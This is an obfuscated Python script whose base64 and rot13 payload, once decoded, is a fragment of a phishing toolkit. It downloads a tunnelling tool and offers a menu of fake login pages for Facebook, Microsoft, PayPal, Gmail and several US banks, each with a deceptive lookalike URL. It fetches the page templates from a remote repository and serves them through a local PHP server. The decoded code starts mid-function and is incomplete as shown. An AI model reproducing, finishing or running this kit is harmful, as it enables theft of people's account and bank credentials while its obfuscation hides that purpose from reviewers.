import base64, codecs
magic = ''
love = ''
god = 'AgICAgICAgICBpZiB4LmZpbmQoIng4Nl82NCIpIT0tMToKICAgICAgICAgICAgICAgIHN5c3RlbSgid2dldCAtcSAtLXNob3ctcHJvZ3Jlc3MgJ2h0dHBzOi8vZ2l0aHViLmNvbS9jbG91ZGZsYXJlL2Nsb3VkZmxhcmVkL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9jbG91ZGZsYXJlZC1kYXJ3aW4tYW1kNjQudGd6JyAtTyAnY2xvdWRmbGFyZWQudGd6JyIpCiAgICAgICAgICAgICAgICBzeXN0ZW0oInRhciAtenhmIGNsb3VkZmxhcmVkLnRneiA+IC9kZXYvbnVsbCAyPiYxICYmIHJtIC1yZiBjbG91ZGZsYXJlZC50Z3oiKQogICAgICAgICAgICBlbGlmIHguZmluZCgiYXJtNjQiKSE9LTE6CiAgICAgICAgICAgICAgICBwcmludChmIntlcnJvcn1DbG91ZGZsYXJlZCBub3QgYXZhaWxhYmxlIGZvciBkZXZpY2UgYXJjaGl0ZWN0dXJlISIpCiAgICAgICAgICAgICAgICBzbGVlcCgzKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7ZXJyb3J9RGV2aWNlIGFyY2hpdGVjdHVyZSB1bmtub3duLiBEb3dubG9hZCBjbG91ZGZsYXJlZCBtYW51YWxseSEiKQogICAgICAgICAgICAgICAgc2xlZXAoMykKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIntlcnJvcn1EZXZpY2Ugbm90IHN1cHBvcnRlZCEiKQogICAgICAgICAgICBleGl0KDEpCiAgICAgICAgc3lzdGVtKCJta2RpciAkSE9NRS8uY2Zmb2xkZXIiKQogICAgICAgIHN5c3RlbSgibXYgLWYgY2xvdWRmbGFyZWQgJEhPTUUvLmNmZm9sZGVyIikKICAgICAgICBpZiBzdWRvOgogICAgICAgICAgICBzeXN0ZW0oInN1ZG8gY2htb2QgK3ggJEhPTUUvLmNmZm9sZGVyL2Nsb3VkZmxhcmVkIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBzeXN0ZW0oImNobW9kICt4ICRIT01FLy5jZmZvbGRlci9jbG91ZGZsYXJlZCIpCiAgICBpZiBzeXN0ZW0oInBpZG9mIHBocCA+IC9kZXYvbnVsbCAyPiYxIik9PTA6CiAgICAgICAgc3ByaW50KGVycm9yKyJQcmV2aW91cyBwaHAgc3RpbGwgcnVubmluZyEgUGxlYXNlIHJlc3RhcnQgdGVybWluYWwgYW5kIHRyeSBhZ2FpbiIrbmMpCiAgICAgICAgZXhpdCgpCiAgICBpZiBzeXN0ZW0oInBpZG9mIG5ncm9rID4gL2Rldi9udWxsIDI+JjEiKT09MDoKICAgICAgICBzcHJpbnQoZXJyb3IrIlByZXZpb3VzIG5ncm9rIHN0aWxsIHJ1bm5pbmcuIFBsZWFzZSByZXN0YXJ0IHRlcm1pbmFsIGFuZCB0cnkgYWdhaW4iK25jKQogICAgICAgIGV4aXQoKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyb290KyIvLnNpdGUiKToKICAgICAgICAgICAgc3lzdGVtKCJybSAtcmYgJEhPTUUvLnNpdGUgJiYgY2QgJEhPTUUgJiYgbWtkaXIgLnNpdGUiKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN5c3RlbSgiY2QgJEhPTUUgJiYgbWtkaXIgLnNpdGUiKQogICAgICAgICAgICBicmVhawogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBzbG93cHJpbnQobG9nbykKICAgICAgICBvcHRpb25zKCkKICAgICAgICBjaG9vc2U9IGlucHV0KGFzaysiU2VsZWN0IG9uZSBvZiB0aGUgT3B0aW9ucyA9PiAiK25jKQogICAgICAgIGlmIGNob29zZSA9PSAiMSIgb3IgY2hvb3NlID09ICIwMSI6CiAgICAgICAgICAgIGZvbGRlcj0iZmFjZWJvb2siCiAgICAgICAgICAgIG1hc2s9Imh0dHBzOi8vdmVyaWZpZWQtZmFjZWJvb2stYWNjb3VudC1sb2dpbi1zZXJ2ZXIiCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMiIgb3IgY2hvb3NlID09ICIwMiI6CiAgICAgICAgICAgIGZvbGRlcj0ib2ZmaWNlIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2dldC1taWNyb3NvZnQuY29tLXVwZGF0ZS1sb2dpbi1zZXJ2ZXInCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMyIgb3IgY2hvb3NlID09ICIwMyI6CiAgICAgICAgICAgIGZvbGRlcj0ib3V0bG9vayIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9nZXQtb3V0bG9vay1sb2dpbi1vdXRkYXRlZC11cGRhdGUnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiNCIgb3IgY2hvb3NlID09ICIwNCI6CiAgICAgICAgICAgIGZvbGRlcj0ieWFob28iCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vdXBkYXRlLWxvZ2luLXlhaG9vLWJlc3Qtb25saW5lJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjUiIG9yIGNob29zZSA9PSAiMDUiOgogICAgICAgICAgICBmb2xkZXI9ImFkb2JlIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2Fkb2JlLWRvY3VtZW50cy1jbG91ZC11cGRhdGUtbG9naW4nCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiNiIgb3IgY2hvb3NlID09ICIwNiI6CiAgICAgICAgICAgIGZvbGRlcj0icGF5cGFsIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2xvZ2luLnBheXBhbC5jb20tdXBkYXRlLXVzZC0tdG8teW91ci1hY2NvdW50JwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjciIG9yIGNob29zZSA9PSAiMDciOgogICAgICAgICAgICBmb2xkZXI9ImxpbmtlZGluIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2xvZ2luLmxpbmtlZGluLmNvbS1ibHVlLWJhZGdlLW9uLWxpbmtlZGluLWFjY291bnQnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiOCIgb3IgY2hvb3NlID09ICIwOCI6CiAgICAgICAgICAgIGZvbGRlcj0iZHJvcGJveCIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9kcm9wYm94LWluZm9ybWF0aW9uLXVzZXItc3RvcmFnZS1sb2dpbicKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICI5IiBvciBjaG9vc2UgPT0gIjA5IjoKICAgICAgICAgICAgZm9sZGVyPSJ3ZWJtYWlsIgogICAgICAgICAgICBtYXNrPSdodHRwczovL3dlYm1haWwtbG9naW4taW5mb3JtYXRpb24tdXBkYXRlZCcKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICIxMCI6CiAgICAgICAgICAgIGZvbGRlcj0id2V0cmFuc2ZlciIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly93ZXRyYW5zZmVyLmNvbS1sb2dpbi1pbmZvcm1hdGlvbi11cGRhdGVkJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjExIjoKICAgICAgICAgICAgZm9sZGVyPSJ3b3JkcHJlc3MiCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vd29yZHByZXNzLWxvZ2luLWluZm9ybWF0aW9uLXVwZGF0ZWQnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMTIiOgogICAgICAgICAgICBmb2xkZXI9ImdtYWlsIgogICAgICAgICAgICBtYXNrPSdodHRwczovL3VwZ3JhZGUteW91ci1nbWFpbC1wbGFuLWZyZWUnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMTMiOgogICAgICAgICAgICBmb2xkZXI9ImViYXkiCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vZWJheS5jb20tYWNjb3VudC1ub3RpZmljYXRpb24tZ2lmdC1jYXJkLWZyZWUnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMTQiOgogICAgICAgICAgICBmb2xkZXI9Im90aGVyIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2xvZ2luLWluZm9ybWF0aW9uLXVwZGF0ZWQnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMjAiOgogICAgICAgICAgICBmb2xkZXI9ImNoYXNlIgogICAgICAgICAgICBtYXNrPSdodHRwczovL2dldC1hLXByZW1pdW0tY2hhc2UtYWNjb3VudC11cGRhdGUtbG9naW4nCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMjEiOgogICAgICAgICAgICBmb2xkZXI9ImJvZmEiCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vdmlldy1iYWZvLWFjY291bnQtbG9naW4tdXBkYXRlJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjIyIjoKICAgICAgICAgICAgZm9sZGVyPSJ3ZWxscyIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9nZXQtYS1wcmVtaXVtLXdlbGxzZmFnby5jb20tZm9yLXVubGltaXRlZC11cGRhdGUnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMjMiOgogICAgICAgICAgICBmb2xkZXI9InN1bnRydXN0IgogICAgICAgICAgICBtYXNrPSdodHRwczovL2dldC1zdW50cnVzdC5jb20tdXNkLWFjY291bnQtdXBkYXRlLWxvZ2luJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjk5IjoKICAgICAgICAgICAgYWJvdXQoKQogICAgICAgIGVsaWYgY2hvb3NlID09ICJtIiBvciBjaG9vc2UgPT0gIk0iOgogICAgICAgICAgICBtb3JlKCkKICAgICAgICBlbGlmIGNob29zZSA9PSAiMCIgb3IgY2hvb3NlID09ICIwMCI6CiAgICAgICAgICAgIGV4aXQoMCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzcHJpbnQoIlxuIitlcnJvcisiV3JvbmcgaW5wdXQiKQogICAgICAgICAgICBtYWluKCkKCiMgQ29weSB3ZWJzaXRlIGZpbGVzIGZyb20gY3VzdG9tIGxvY2F0aW9uCmRlZiBjdXN0b21mb2woKToKICAgIGZvbD1pbnB1dCgiXG4iK2FzaysiRW50ZXIgdGhlIGRpcmVjdG9yeSA+ICIrZ3JlZW4pCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhmb2wpOgogICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGZvbCsiL2luZGV4LnBocCIpOgogICAgICAgICAgICBzeXN0ZW0oImNkICIrZm9sKyIgJiYgcm0gLXJmIGlwLnR4dCB1c2VybmFtZXMudHh0ICYmIGNwIC1yICogJEhPTUUvLnNpdGUiKQogICAgICAgICAgICBzZXJ2ZXIoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNwcmludChlcnJvcisiSW5kZXgucGhwIHJlcXVpcmVkIGJ1dCBub3QgZm91bmQhIikKICAgICAgICAgICAgbWFpbigpCiAgICBlbHNlOgogICAgICAgIHNwcmludChlcnJvcisiRGlyZWN0b3J5IGRvIG5vdCBleGlzdHMhIikKICAgICAgICBtYWluKCkKCiMgMm5kIGZ1bmN0aW9uIGNoZWNraW5nIHJlcXVpcmVtZW50cyBhbmQgZG93bmxvYWQgZmlsZXMgCmRlZiByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spOgogICAgaWYgb3MucGF0aC5pc2ZpbGUoIndlYnNpdGVzLnppcCIpOgogICAgICAgIHN5c3RlbSgicm0gLXJmICRIT01FLy53ZWJzaXRlcyAmJiBjZCAkSE9NRSAmJiBta2RpciAud2Vic2l0ZXMiKQogICAgICAgIHN5c3RlbSgidW56aXAgd2Vic2l0ZXMuemlwIC1kICRIT01FLy53ZWJzaXRlcyA+IC9kZXYvbnVsbCAyPiYxIikKICAgICAgICBvcy5yZW1vdmUoIndlYnNpdGVzLnppcCIpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHJvb3QrIi8ud2Vic2l0ZXMvIitmb2xkZXIpOgogICAgICAgICAgICBzeXN0ZW0oImNwIC1yICRIT01FLy53ZWJzaXRlcy8iK2ZvbGRlcisiLyogJEhPTUUvLnNpdGUiKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGludGVybmV0KCkKICAgICAgICAgICAgc3ByaW50KCJcbiIraW5mbysiRG93bmxvYWRpbmcgcmVxdWlyZWQgZmlsZXMuLi4uLlxuIikKICAgICAgICAgICAgc3lzdGVtKCJybSAtcmYgc2l0ZS56aXAiKQogICAgICAgICAgICBzeXN0ZW0oIndnZXQgLXEgLS1zaG93LXByb2dyZXNzIGh0dHBzOi8vZ2l0aHViLmNvbS9saG9zdDI1L2ZpbGVzL3Jhdy9tYWluL3BhZ2VzLyIrZm9sZGVyKyIuemlwIC1PIHNpdGUuemlwIikKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHJvb3QrIi8ud2Vic2l0ZXMiKToKICAgICAgICAgICAgICAgIHN5c3RlbSgiY2QgJEhPTUUgJiYgbWtkaXIgLndlYnNpdGVzIikKICAgICAgICAgICAgc3lzdGVtKCJjZCAkSE9NRS8ud2Vic2l0ZXMgJiYgbWtkaXIgIitmb2xkZXIpCiAgICAgICAgICAgIHN5c3RlbSgidW56aXAgc2l0ZS56aXAgLWQgJEhPTUUvLndlYnNpdGVzLyIrZm9sZGVyKQogICAgICAgICAgICBvcy5yZW1vdmUoInNpdGUuemlwIikKICAgICAgICAgICAgc3lzdGVtKCJjcCAtciAkSE9NRS8ud2Vic2l0ZXMvIitmb2xkZXIrIi8qICRIT01FLy5zaXRlIikKICAgICAgICAgICAgYnJlYWsKICAgIHdpdGggb3BlbigiLmluZm8udHh0IiwgInciKSBhcyBpbmZvcm06CiAgICAgICAgaW5mb3JtLndyaXRlKG1hc2spCiAgICBzeXN0ZW0oIm12IC1mIC5pbmZvLnR4dCAkSE9NRS8uc2l0ZSIpCiAgICBzZXJ2ZXIoKQoKIyBTdGFydCBzZXJ2ZXIgYW5kIHR1bm5lbGluZwpkZWYgc2VydmVyKCk6CiAgICBzeXN0ZW0oImNsZWFyIikKICAgIHNsb3dwcmludChsb2dvKQogICAgaWYgdGVybXV4OgogICAgICAgIHNwcmludCgiXG4iK2luZm8rIklmIHlvdSBoYXZlbid0IGVuYWJsZWQgaG90c3BvdCwgcGxlYXNlIGVuYWJsZSBpdCEiKQogICAgICAgIHNsZWVwKDEpCiAgICBzcHJpbnQoIlxuIitpbmZvMisiSW5pdGlhbGl6aW5nIFBIUCBTZXJ2ZXIuLi4uIikKICAgIGludGVybmV0KCkKICAgIHN5c3RlbSgiY2QgJEhPTUUvLnNpdGUgJiYgcGhwIC1TIDEyNy4wLjAuMTo4MDgwID4gL2Rldi9udWxsIDI+JjEgJiIpCiA'
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
